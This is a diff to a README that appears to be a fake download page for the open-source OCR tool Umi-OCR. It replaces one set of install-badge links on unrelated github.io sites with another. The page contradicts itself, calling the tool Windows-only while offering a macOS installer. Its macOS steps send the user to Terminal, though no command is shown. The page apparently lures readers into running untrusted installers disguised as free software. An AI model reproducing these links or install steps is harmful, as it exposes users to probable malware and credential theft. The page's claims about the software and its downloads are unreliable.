@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-OCR-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-OCR+Tool-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Umi-OCR Free Installer** — Umi-OCR is a free, open-source offline OCR application for Windows that converts text in images to editable text without internet connectivity. Works without internet access, no account required. Full offline installation.
+**💻 Umi-OCR Free Installer** — Umi-OCR is a free, open-source Windows OCR application that extracts text from screenshots, images, and PDF files. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Umi-OCR](https://img.shields.io/badge/⬇_Install_Umi-OCR-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Umi-OCR](https://img.shields.io/badge/⬇_Install_Umi-OCR-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Umi-OCR
 
-Umi-OCR is a free, open-source offline OCR application for Windows that converts text in images to editable text without internet connectivity. Supports batch processing of image files, automatic screenshot capture with OCR, and table structure recognition for extracting data from tabular images. Umi-OCR uses local OCR engines for privacy-sensitive document processing.
+Umi-OCR is a free, open-source Windows OCR application that extracts text from screenshots, images, and PDF files. It supports batch processing, multiple language recognition, and can import image files directly for text extraction.
 
 ---
 
 ## ❌ Problem: Umi-OCR is hard to access
 
-- **Windows Only** — No cross-platform support
-- **OCR Engine Quality** — Accuracy depends on configured OCR engine and image quality
-- **Complex Documents** — Accuracy decreases with complex multi-column layouts
-- **Language Coverage** — Non-Latin script accuracy may require specific engine configuration
+- **Windows Only** — Not available on macOS or Linux
+- **OCR Engine Required** — Requires separate OCR engine (Paddle OCR or similar) configuration
+- **Chinese-Primary Development** — Documentation and community primarily in Chinese
+- **Setup Complexity** — Initial configuration of OCR engine requires technical steps
 
 ---
 
@@ -61,9 +61,9 @@ Umi-OCR is a free, open-source offline OCR application for Windows that converts
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Umi-OCR is a free, open-source offline OCR application for Windows that converts
 
 <div align="center">
 
-[![⬇ Install Umi-OCR](https://img.shields.io/badge/⬇_Install_Umi-OCR-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Umi-OCR](https://img.shields.io/badge/⬇_Install_Umi-OCR-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Umi-OCR is a free, open-source offline OCR application for Windows that converts
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Umi-OCR is a free, open-source offline OCR application for Windows that converts
 
 ---
 
-**Umi-OCR Free Installer** — Umi-OCR is a free, open-source offline OCR application for Windows that converts text in images to editable text without internet connectivity. Install without internet connection today!
+**Umi-OCR Free Installer** — Umi-OCR is a free, open-source Windows OCR application that extracts text from screenshots, images, and PDF files. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Umi-OCR](https://img.shields.io/badge/⬇_Install_Umi-OCR-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Umi-OCR](https://img.shields.io/badge/⬇_Install_Umi-OCR-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
